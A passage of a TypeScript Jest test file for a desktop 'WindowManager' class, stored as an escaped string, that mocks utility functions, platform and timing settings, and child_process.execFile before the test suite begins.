}\n    },\n    platform: {\n        isMac: true\n    },\n    timing: {\n        windowHideDelay: 100,\n        appFocusDelay: 200\n    },\n    getInputHtmlPath: jest.fn(() => '/test/input.html')\n}));\n\nconst { getCurrentApp, getActiveWindowBounds, logger } = jest.requireMock('../../src/utils/utils') as any;\n// Fix getCurrentApp to return string for consistency\ngetCurrentApp.mockResolvedValue('TestApp');\n// Make getActiveWindowBounds return null so tests fall back to cursor positioning\ngetActiveWindowBounds.mockResolvedValue(null);\nconst { execFile } = jest.requireMock('child_process') as any;\nconst mockedExecFile = execFile as jest.MockedFunction<"+"typeof execFile>;\n// Keep mockedExec as alias for backward compatibility in tests\nconst mockedExec = mockedExecFile;\n\ndescribe('WindowManager', () => {\n    let windowManager: WindowManager;\n    let mockWindow: any;\n\n    beforeEach(() => {\n
